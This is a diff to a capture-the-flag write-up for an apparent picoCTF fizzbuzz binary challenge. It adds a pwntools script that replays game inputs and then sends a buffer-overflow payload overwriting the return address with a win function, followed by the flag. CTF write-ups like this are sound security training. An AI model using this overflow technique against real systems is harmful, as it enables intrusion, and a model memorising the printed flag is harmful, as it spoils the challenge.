@@ -822,6 +822,62 @@ We convert the input list into a string then add it to the `finale` array. The o
 buzz_fizz_trace.py> Finished!
 ```
 
-The output is an 2-dimensional array of `FizzBuzz(n, [Equals(y), NotEquals(x) ...])`.
+The output is an 2-dimensional array of `FizzBuzz(n, ['Equals(y)', 'NotEquals(x)' ...])` (note that the conditions are a list of strings).
+I also saved it to a file so that it can be read later.
 
 ## Writing the exploit
+Now that we know what input to provide to get our buffer overflow, we need to know what to do once we get control. Specifically, there is a function (`0x8048656`)
+that will print out the flag.
+
+```python
+from pwn import *
+
+win = 0x8048656
+c = remote("mercury.picoctf.net:28132")
+ops = []
+
+with open("./ops.txt") as f: # this is the file where I saved the output
+    ops = eval(f.read())
+
+def NotEquals(n):
+    return lambda x: x != n
+def Equals(n):
+    return lambda x: x == n
+
+# get the appropriate input to provide,
+# based on Equals and NotEquals conditions
+def get(eqs):
+    eqs = list(eqs)
+    # lame method of finding a number that fits
+    for i in range(1, 0x100):
+        if all(map(lambda x: x(i), eqs)):
+            return i
+
+def FizzBuzz(a, l):
+    eqs = map(eval, l)
+    n = get(eqs)
+    for i in range(1, n):
+        if i % 15 == 0:
+            c.sendline("fizzbuzz")
+        elif i % 5 == 0:
+            c.sendline("buzz")
+        elif i % 3 == 0:
+            c.sendline("fizz")
+        else:
+            c.sendline(str(i))
+    if n != a:
+        c.sendline("NANI") # exiting early
+
+t = len(ops)
+for op1 in ops:
+    for op in op1:
+        eval(op)
+
+c.send(cyclic(9))
+#          padding        saved rbp         win
+c.sendline(cyclic(0x63) + p32(0xfffffff0) + p32(win)) # buffer overflow
+
+c.interactive()
+```
+
+Flag is `picoCTF{y0u_found_m3}`
